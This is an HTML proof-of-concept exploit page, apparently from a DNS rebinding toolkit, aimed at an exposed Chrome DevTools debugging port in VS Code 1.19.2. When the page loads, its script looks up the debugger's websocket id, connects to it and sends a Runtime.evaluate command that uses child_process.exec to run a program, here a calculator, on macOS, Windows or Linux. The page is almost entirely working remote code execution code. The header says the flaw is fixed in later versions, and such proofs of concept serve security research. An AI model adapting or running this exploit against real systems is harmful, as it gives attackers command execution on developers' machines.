<!--
    Multi-platform exploit adapted from:
    https://medium.com/0xcc/visual-studio-code-silently-fixed-a-remote-code-execution-vulnerability-8189e85b486b

    Tested against VS Studio Code 1.19.2 and at least one another software with a slight modification.
    Subsequent versions of VS Studio Code fixed the issue.
    The default port is TCP 9333 (localhost:9333).
-->
<!doctype html>
<html>

<head>
    <title>payload-exposed-chrome-devtools</title>
    <script src="payload.js"></script>
    <script>
        function attack(headers, cookie, body) {

            let data = JSON.parse(body)[0];
            let wsid = data.id;
            let wsURL = "ws://" + window.location.hostname + ":" + window.location.port +
                "/" + wsid;
            console.log(wsURL);
            exploit(wsURL);
        }

        function exploit(url) {
            function nodejs() {
                const cmd = {
                    darwin: 'open /Applications/Calculator.app',
                    win32: 'calc',
                    linux: 'xcalc',
                };
                process.mainModule.require('child_process').exec(
                    cmd[process.platform])
            };
            const packet = {
                "id": 1,
                "method": "Runtime.evaluate",
                "params": {
                    "expression": `(${nodejs})()`,
                }
            };
            const ws = new WebSocket(url);
            ws.onopen = () => ws.send(JSON.stringify(packet));
            ws.onmessage = (data) => console.log(data);
            ws.onerror = (e) => console.log(e);
        }
    </script>
</head>

<body onload="begin('/json')" )>
    <h3>Exposed Chrome Devtools Payload</h3>
    <p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
</body>

</html>